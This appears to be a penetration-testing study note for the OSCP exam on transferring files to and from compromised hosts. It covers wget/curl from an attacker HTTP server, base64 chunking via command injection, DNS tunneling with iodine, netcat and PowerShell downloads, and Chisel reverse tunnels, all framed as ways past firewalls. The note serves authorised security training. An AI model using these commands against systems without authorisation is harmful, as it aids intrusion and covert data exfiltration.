---
title: Transferring Files
date: 2024-10-23
tags:
  - "#oscp"
  - "#technique"
  - "#exploitation"
techniques:
  - copy files
  - download
  - upload
  - transfer
tools:
  - wget
  - crul
  - scp
  - file
  - iodine
  - tunneling
  - dns tunneling
  - tunnel
  - chisel
machines: ""
difficulty:
  - ""
status:
  - in-progress
type: ""
os: ""
categories:
  - ""
exam-priority:
  - medium
time-invested: ""
notes: |
  Key points and takeaways from the exercise.
---

### References
- [Example Tutorial](https://example.com/tutorial)
- [OSCP Exploit Documentation](https://documentation.oscp.org/exploitations)

### **Overview**

During penetration testing, transferring files such as enumeration scripts, exploits, or other data between an attack machine and a remote server is common. Here, we'll explore different methods for securely and efficiently transferring files when you have code execution or SSH access to a remote host.

---

### **Methods for Transferring Files**

### 1. **Using `wget` and `cURL`**

**Scenario**: You have command-line access to the remote host, and the host can reach your machine via network.

- **Python HTTP Server Setup on Attacker’s Machine**: Run a simple Python HTTP server to serve files from your directory.
    
    ```bash
    cd /path/to/your/file
    python3 -m http.server 8000
    
    ```
    
    This starts serving files from the directory on `http://your_ip:8000/`.
    
- **Download on the Remote Host (with `wget`)**: On the remote machine, download the file using:
    
    ```bash
    wget http://your_ip:8000/filename.sh
    
    ```
    
- **Alternative Download (with `cURL`)**: If `wget` is not available, use `cURL`:
    
    ```bash
    curl http://your_ip:8000/filename.sh -o filename.sh
    
    ```
    

---

### 2. **Using `scp` (Secure Copy)**

**Scenario**: You have SSH credentials for the remote host.

- Transfer a file to the remote machine using `scp`:
    
    ```bash
    scp filename.sh user@remotehost:/path/to/save/
    ```
    
- You will be prompted for the SSH password if not using key-based authentication.
    

---

### 3. **Using `base64` Encoding**

**Scenario**: Direct file transfers are blocked by firewalls, so you use a copy-paste method with base64 encoding.

- **Encode the File (Attacker’s Machine)**: Convert the file to a base64 string to avoid firewall issues.
    
    ```bash
    base64 filename -w 0
    ```
    
- Encode the file using `base64` and generate a single-line string with the `-w 0` option to avoid line breaks:
    
- **Decode the File (Remote Host)**: Copy the base64 string to the remote host, decode it, and save the result to a file.
    
    ```bash
    echo "base64_string" | base64 -d > output_file
    
    ```
    
    ### **Method 2: Use a Text File**
    
    1. **On the Attacker Machine**:
        
        Encode the file and save the base64 output to a text file:
        
        ```bash
        base64 filename -w 0 > base64_encoded.txt
        
        ```
        
    2. **Transfer the Text File**:
        
        Use any of the regular file transfer methods (like `scp`, `wget`, or `curl`) to transfer the `base64_encoded.txt` file to the target machine.
        
    3. **On the Target Machine**:
        
        Decode the file:
        
        ```bash
        cat base64_encoded.txt | base64 -d > output_filename
        
        ```
        
    4. **Verify the Transfer**:
        
        Again, verify using `file` or `md5sum` to confirm successful transfer.
        
    
    This process is useful when you can't directly transfer files due to firewall or other restrictions, but you still have a way to copy-paste text or transfer a text file to the target machine.
    
    If you're unable to use **copy-paste** between your attacker machine and the target machine, and **file transfer methods are blocked by a firewall**, you can use **interactive manual typing** or **split the base64 string** into smaller parts. Here are alternative methods:
    
    ### **Method 1: Manual Typing (For Small Files)**
    
    If the file you're trying to transfer is small (or you have no other options), you could manually type the base64-encoded string into the target machine. However, this is tedious and prone to errors, so it's not ideal for larger files.
    
    ### **Method 2: Break the Base64 String into Chunks (More Practical)**
    
    If you can't copy and paste the entire base64 string but have SSH or remote command execution, you can break the base64 string into smaller, manageable chunks and manually transfer each chunk to the target machine. You can then reassemble the file on the target.
    
    1. **On the Attacker Machine:**
        
        - Encode the file and split it into smaller chunks:This will create multiple chunk files (e.g., `base64_chunk_aa`, `base64_chunk_ab`, `base64_chunk_ac`, etc.), each containing part of the base64-encoded string. The `b 1000` flag specifies the chunk size (1000 bytes per file).
            
            ```bash
            base64 filename | split -b 1000 - base64_chunk_
            
            ```
            
    2. **On the Target Machine:**
        
        - **Manually type each chunk** or send each chunk individually through the available remote access method:
            - First, start an empty file to store the reassembled base64 string:
                
                ```bash
                touch assembled_base64.txt
                
                ```
                
            - Append each chunk one by one. You can manually type the content of each chunk into the file (or send it via SSH if possible):
                
                ```bash
                echo "base64_chunk_aa_content_here" >> assembled_base64.txt
                echo "base64_chunk_ab_content_here" >> assembled_base64.txt
                
                ```
                
                (Continue until all chunks are added to `assembled_base64.txt`.)
                
    3. **Decode the Reassembled Base64 File:**
        
        - Once all chunks are added to `assembled_base64.txt`, decode the base64 string into the original file:
            
            ```bash
            cat assembled_base64.txt | base64 -d > output_filename
            
            ```
            
    4. **Verify the Transfer:**
        
        - Verify that the file was transferred successfully using:
            
            ```bash
            file output_filename
            md5sum output_filename
            
            ```
            
    
    ### **Method 3: Command Injection or Reverse Shell Exploit**
    
    If you have a **limited reverse shell** or **command injection vulnerability** on the target, you could transfer chunks of the base64 string by executing commands directly on the remote machine:
    
    1. **On the Attacker Machine:**
        
        - Encode the file and split the base64 string into small parts, as shown in Method 2.
    2. **On the Target Machine (via Shell or Command Injection):**
        
        - Run commands to append each chunk into a file on the target machine:Continue until all chunks are transferred.
            
            ```bash
            echo "base64_chunk_aa_content_here" >> /tmp/assembled_base64.txt
            echo "base64_chunk_ab_content_here" >> /tmp/assembled_base64.txt
            
            ```
            
    3. **Decode the File:** After all chunks have been sent, decode the base64 string:
        
        ```bash
        cat /tmp/assembled_base64.txt | base64 -d > output_filename
        
        ```
        
    
    ### **Method 4: Using DNS or HTTP Tunneling**
    
    If direct file transfer is blocked but you can make outbound DNS or HTTP requests, you could use a **DNS exfiltration** or **HTTP tunneling** tool to transfer data in smaller chunks. This is more advanced but can bypass some firewall restrictions.
    
    When traditional file transfer methods like `wget`, `scp`, or even manual copy-pasting aren't working due to firewalls or network restrictions, **DNS or HTTP tunneling** can be used to bypass these restrictions. These methods work by encapsulating your data in seemingly normal DNS or HTTP requests, which are typically allowed through firewalls.
    
    Here's how you can achieve file transfer via DNS or HTTP tunneling:
    
    ---
    
    ### **DNS Tunneling**
    
    DNS tunneling uses the DNS protocol to send data across a network by encoding it into DNS queries and responses. This technique can be used to bypass firewalls that don't block DNS traffic.
    
    ### **Steps for DNS Tunneling:**
    
    1. **Set up a DNS tunneling server on the attacker machine:** You need a tool like **Iodine** or **Dnscat2** to set up a DNS tunnel server. These tools encode data in DNS queries that the client sends to the server.
        
        **Example using Iodine:**
        
        - On the attacker machine (the DNS server):
            
            ```bash
           sudo apt-get install iodine
            sudo iodined -f 10.0.0.1 example.com
            
            ```
            
            Replace `example.com` with your registered domain that you control. You must configure your DNS to point to the attacker's server.
            
    2. **Set up the DNS tunneling client on the target machine:**
        
        - If you can execute commands on the target machine, you can use **Iodine** as a client to connect back to your server:
            
            ```bash
            sudo apt-get install iodine
            sudo iodine -f 10.0.0.1 example.com
            
            ```
            
            This creates a virtual network interface on the target that allows data to flow through the DNS tunnel.
            
    3. **Transfer files through the DNS tunnel:**
        
        - Once the tunnel is established, you can use standard file transfer protocols like `scp`, `wget`, or `curl` over this DNS tunnel.
        
        You can also tunnel a command shell or other traffic through this interface.
        
    
    ### **Tools for DNS Tunneling:**
    
    - **Iodine**: A tool for setting up DNS tunneling over a virtual network interface.
    - **dnscat2**: A tool specifically designed for exfiltrating data using DNS queries.
    
    ### **Scenario**
    
    You have access to the target machine, but traditional file transfer methods (like `scp`, `wget`, or `curl`) are blocked due to a firewall. However, the firewall allows DNS traffic. You want to use DNS tunneling to transfer files from your attacker machine (your local machine) to the target machine by encapsulating data in DNS queries.
    
    ---
    
    ### **Step 1: Set up DNS Tunneling on Your (Attacker) Machine**
    
    ### **1.1 Install Iodine on the Attacker Machine**
    
    First, ensure that Iodine is installed on your local machine (the attacker).
    
    ```bash
    sudo apt-get install iodine
    
    ```
    
    ### **1.2 Configure DNS for Your Domain**
    
    - You need a domain name that you control (e.g., `example.com`).
    - Create a DNS `A` record for your domain pointing to your attacker machine’s public IP (e.g., `123.45.67.89`).
    - This will allow DNS requests to reach your server.
    
    Example:
    
    - Domain: `example.com`
    - Subdomain for tunneling: `tunnel.example.com` → points to `123.45.67.89`
    
    ### **1.3 Start the Iodine Server on Your Attacker Machine**
    
    Run the following command to start the DNS tunneling server. Assign an internal IP (like `10.0.0.1`) to the virtual network interface.
    
    ```bash
    sudo iodined -f 10.0.0.1 tunnel.example.com
    
    ```
    
    Here:
    
    - `f` makes Iodine run in the foreground (you can omit this if you want it to run in the background).
    - `10.0.0.1` is the IP address assigned to the virtual interface on the DNS tunnel.
    - `tunnel.example.com` is the subdomain you set up for tunneling.
    
    After running the command, you should see output indicating the Iodine server is running, similar to this:
    
    ```bash
    Opened dns0
    Sending fake version: Iodine 0.7.0
    Setting IP of dns0 to 10.0.0.1
    Ready, tunnel.example.com is up and running.
    
    ```
    
    ---
    
    ### **Step 2: Set up DNS Tunneling on the Target Machine**
    
    Now that the DNS tunnel server is running on your attacker machine, you need to configure the target machine to connect to it via DNS tunneling.
    
    ### **2.1 Install Iodine on the Target Machine**
    
    If Iodine is not already installed on the target machine, and you have enough privileges, install it:
    
    ```bash
    sudo apt-get install iodine
    
    ```
    
    ### **2.2 Start the Iodine Client on the Target Machine**
    
    Run the following command on the target machine to connect to your DNS tunneling server:
    
    ```bash
    sudo iodine -f 123.45.67.89 tunnel.example.com
    
    ```
    
    Here:
    
    - `123.45.67.89` is the public IP address of your attacker machine where the DNS tunneling server is running.
    - `tunnel.example.com` is the subdomain you set up for DNS tunneling.
    
    This will initiate a connection to the DNS tunneling server on your attacker machine, creating a virtual network interface on the target machine.
    
    ### **2.3 Verify Connection**
    
    Once the connection is established, a virtual network interface (like `dns0`) should be created on the target machine. This interface will have an internal IP, such as `10.0.0.2`.
    
    Run the following command on the target machine to verify the virtual interface and IP address:
    
    ```bash
    bash
    Copy code
    ifconfig dns0
    
    ```
    
    The output should show something like:
    
    ```bash
    dns0      Link encap:UNSPEC  HWaddr ...
              inet addr:10.0.0.2  P-t-P:10.0.0.1 Mask:255.255.255.0
              ...
    
    ```
    
    ---
    
    ### **Step 3: Transfer Files Over the DNS Tunnel**
    
    Now that the DNS tunnel is established, you can transfer files from the attacker machine to the target or vice versa.
    
    ### **3.1 On the Attacker Machine**
    
    You can use `scp` or other tools over the DNS tunnel to transfer files. Here’s an example of transferring a file using `scp`:
    
    ```bash
    bash
    Copy code
    scp -P 22 /path/to/localfile user@10.0.0.2:/path/to/remotefile
    
    ```
    
    Here:
    
    - `10.0.0.2` is the virtual IP address of the target machine (inside the tunnel).
    - `/path/to/localfile` is the path of the file you want to transfer on your attacker machine.
    - `/path/to/remotefile` is the destination path on the target machine.
    
    ---
    
    ### **Step 4: Validate File Transfer**
    
    After transferring the file, you can verify the integrity of the file on both machines by running `md5sum`:
    
    ### **On the Attacker Machine:**
    
    ```bash
    bash
    Copy code
    md5sum /path/to/localfile
    
    ```
    
    ### **On the Target Machine:**
    
    ```bash
    bash
    Copy code
    md5sum /path/to/remotefile
    
    ```
    
    Both outputs should be identical, confirming that the file transfer was successful.
    
    ---
    
    ### **Summary**
    
    1. **Set up DNS tunneling server** on the attacker machine using Iodine.
    2. **Configure DNS records** for your domain to point to your attacker's public IP.
    3. **Connect to the DNS tunneling server** from the target machine using Iodine as the client.
    4. **Use the virtual network interface** (created via DNS tunneling) to transfer files or run commands.
    
    This method bypasses firewalls that block other traffic types but allow DNS, making it effective in environments with restricted outbound connections.
    
    ### **Tools for DNS Tunneling**
    
    - **Iodine**: A widely used tool for DNS tunneling.
    - **Dnscat2**: Another popular tool for tunneling data over DNS.
    
    ---
    
    # DNS Tunneling Windows
    
    If the **target machine is a Windows system**, you can still set up DNS tunneling, but the process differs since Windows doesn't natively support Linux packages like `iodine`. However, there are **Windows alternatives** for DNS tunneling that you can use to connect to an Iodine server. Here's how you can achieve this on a Windows target:
    
    ---
    
    ### **Step-by-Step: DNS Tunneling on a Windows Target**
    
    ### **Step 1: Use a Windows Client for DNS Tunneling**
    
    Since you can't directly install `iodine` on Windows, you'll need a Windows-compatible tool. Here are a couple of options:
    
    1. **Iodine for Windows (Portable)**:
        - There's a **Windows version** of Iodine available as a portable executable.
        - You can download it from trusted sources (e.g., [here on GitHub](https://github.com/yarrick/iodine/releases)) or compile it yourself.
    2. **DNSCat2**:
        - An alternative tunneling tool that also works over DNS. It has a Windows client available.
        - It can be downloaded from [GitHub DNSCat2 repository](https://github.com/iagox86/dnscat2).
    
    For this guide, let's use **Iodine for Windows**.
    
    ---
    
    ### **Step 2: Download and Set Up Iodine on Windows**
    
    1. **Download the Iodine Windows Client**:
        
        - Go to [Iodine’s GitHub page](https://github.com/yarrick/iodine/releases).
        - Download the appropriate `.exe` file for your Windows version.
        
        Example: `iodine-win32-0.7.0.zip`
        
    2. **Extract the Executable**:
        
        - Extract the downloaded `.zip` file. You should see the `iodine.exe` file.
    
    ---
    
    ### **Step 3: Establish the DNS Tunnel**
    
    1. **Run the Iodine Client on Windows**:
        
        - Open **Command Prompt** (as Administrator) on the target Windows machine.
            
        - Navigate to the folder where you extracted `iodine.exe`.
            
        - Use the following command to establish the DNS tunnel with your attacker machine:
            
            ```bash
            iodine.exe -f <your_public_ip> tunnel.example.com
            ```
            
        
        Here:
        
        - `<your_public_ip>` is your attacker's public IP address (where the Iodine server is running).
        - `tunnel.example.com` is the DNS domain or subdomain pointing to your attacker’s IP (same as in the Linux example).
    2. **Verify the Tunnel Interface**: Once the DNS tunnel is established, you can check the network interfaces on the target Windows machine to see the virtual interface that gets created (like `dns0` in Linux). Run this in Command Prompt:
        
        ```bash
        ipconfig /all
        ```
        
        You should see a new interface with an IP address like `10.0.0.2` assigned (assuming your Iodine server on the attacker machine is set to `10.0.0.1`).
        
    
    ---
    
    ### **Step 4: Transfer Files Over the DNS Tunnel**
    
    Now that the DNS tunnel is active, you can use it to transfer files from your attacker machine to the Windows target. You can do this with standard tools like **Netcat (nc)** or **PowerShell**, or using the **scp** command if SSH is available.
    
    Here are two examples for file transfer:
    
    ---
    
    ### **Option 1: Transfer Files Using Netcat (nc)**
    
    You can use Netcat over the DNS tunnel to transfer files between the machines.
    
    1. **On the Attacker Machine**: Start a listener to send a file via Netcat:
        
        ```bash
        nc -lvnp 4444 < /path/to/file
        
        ```
        
    2. **On the Target (Windows) Machine**: Use Netcat to receive the file:
        
        ```bash
        nc 10.0.0.1 4444 > C:\\path\\to\\outputfile
        
        ```
        
        Here, `10.0.0.1` is the IP of the attacker’s machine through the DNS tunnel.
        
    
    ---
    
    ### **Option 2: Transfer Files Using PowerShell**
    
    You can use PowerShell to download files directly from your attacker machine over HTTP (assuming you have set up a Python HTTP server on your attacker machine, similar to the original example):
    
    1. **On the Attacker Machine**: Start a Python HTTP server:
        
        ```bash
        python3 -m http.server 8000
        
        ```
        
    2. **On the Target (Windows) Machine**: Use PowerShell to download the file from the attacker machine:
        
        ```powershell
        Invoke-WebRequest -Uri <http://10.0.0.1:8000/file.txt> -OutFile C:\\path\\to\\outputfile.txt
        
        ```
        
        Again, `10.0.0.1` is the IP of the attacker’s machine in the DNS tunnel, and this will download `file.txt` from the attacker's HTTP server.
        
    
    ---
    
    ### **Step 5: Validate File Transfer**
    
    After transferring files, you can verify their integrity by checking their hashes on both machines.
    
    - **On the Attacker Machine**:
        
        ```bash
       md5sum /path/to/file
        
        ```
        
    - **On the Target (Windows) Machine**: Use the **CertUtil** command to compute the file’s hash:
        
        ```
        certutil -hashfile C:\\path\\to\\outputfile MD5
        
        ```
        
    
    The output hashes should match, confirming the file was transferred correctly.
    
    ---
    
    ### **Summary**
    
    - **Windows Target**: Use the Iodine Windows client to establish a DNS tunnel with your attacker machine.
    - **File Transfer**: Use Netcat, PowerShell, or other tools to transfer files over the established DNS tunnel.
    
    This method bypasses traditional firewalls and security measures that block common file transfer methods but allow DNS traffic.
    
    ---
    
    ### **HTTP Tunneling**
    
    HTTP tunneling allows you to encapsulate non-HTTP traffic (like file transfers) inside HTTP requests. This is useful for environments where outbound web traffic (HTTP/HTTPS) is allowed, but other forms of traffic are blocked by firewalls.
    
    ### **Steps for HTTP Tunneling:**
    
    1. **Set up an HTTP tunneling tool on the attacker machine:**
        
        - Use tools like **HTTPTunnel**, **Chisel**, or **Tunna** to create an HTTP tunnel server.
        
        **Example using Chisel:**
        
        - On the attacker's machine:
            
            ```bash
            sudo apt-get install chisel
            ./chisel server -p 8080 --reverse
            
            ```
            
            This starts a chisel server listening on port 8080, ready to accept incoming reverse tunnels.
            
    2. **Set up the HTTP tunnel client on the target machine:**
        
        - On the target machine (if you have shell access), set up the reverse connection to the attacker's server:
            
            ```bash
            bash
            Copy code
            ./chisel client <http://10.10.14.1:8080> R:8081:localhost:22
            
            ```
            
            This command creates a reverse tunnel through HTTP. The `R:8081:localhost:22` part means that port 8081 on the attacker's machine is forwarded to port 22 (SSH) on the target. You can change the port or service depending on what you need to tunnel.
            
    3. **Transfer files through the HTTP tunnel:**
        
        - Now that you have an HTTP tunnel, you can transfer files through the tunneled connection using standard tools:
            
            ```bash
            bash
            Copy code
            scp -P 8081 user@localhost:/path/to/file .
            
            ```
            
            The HTTP tunnel will forward the request to the target machine, allowing file transfer despite the firewall.
            
    
    ### **Tools for HTTP Tunneling:**
    
    - **HTTPTunnel**: Allows you to tunnel any TCP connection through an HTTP proxy.
    - **Chisel**: Fast TCP/UDP tunneling over HTTP, great for tunneling services like SSH.
    - **Tunna**: A web application that creates a tunnel using HTTP requests.
    
    ---
    
    ### **When to Use DNS or HTTP Tunneling**
    
    - **DNS tunneling**: Useful when DNS traffic is allowed but other outbound traffic is blocked. DNS queries are often overlooked by firewalls.
    - **HTTP tunneling**: Useful in environments where only web traffic is allowed. HTTP requests can encapsulate other protocols like SSH or SCP for file transfers.
    
    ---
    
    ### **Study Tips**
    
    - **Practice using tunneling tools** in different scenarios, especially in environments with restricted outbound traffic.
    - **Set up a lab environment** to practice file transfers over DNS or HTTP tunneling, and simulate firewall rules to understand how these methods can bypass them.
    - **Master encoding techniques** such as Base64 encoding and scripting the process of sending chunks of data, as they are essential when file transfer is blocked.
    
    ---
    
    ### **Study Tip**
    
    - For real-world situations and exams, always be prepared to handle scenarios where direct file transfer methods are blocked. Practice breaking down encoded data into chunks or manually transferring data as a fallback method when copy-paste isn't available.

---

### **Validating File Transfers**

After transferring a file, it’s important to verify its integrity and format.

### 1. **Using the `file` Command**:

Check the file type on the remote host to confirm it was transferred correctly.

```bash
file output_file

```

### 2. **Using `md5sum`**:

Compare the file’s MD5 hash on both machines to ensure it was transferred without corruption.

- On the attack machine:
    
    ```bash
    md5sum filename
    
    ```
    
- On the remote host:
    
    ```bash
    md5sum output_file
    
    ```
    

If both MD5 hashes match, the file was transferred correctly.

---

### **Study Tips**

- **Practice**: Set up a virtual lab environment with multiple virtual machines (VMs) and practice transferring files using the different methods mentioned.
- **Key Commands**: Memorize key commands for each file transfer method. Knowing the options for `scp`, `wget`, `curl`, and `base64` will help you in both exams and real-world situations.
- **Verify Integrity**: Always practice using `md5sum` or other hashing algorithms (like `sha256sum`) to ensure file integrity after transferring files.
- **Firewall Evasion**: Focus on learning methods like `base64` encoding to bypass firewall restrictions, as this is often tested in exams and is practical in real-life scenarios.
- **Efficiency**: Try to use the quickest and least intrusive method for file transfers based on the situation (e.g., `wget` or `curl` if ports are open).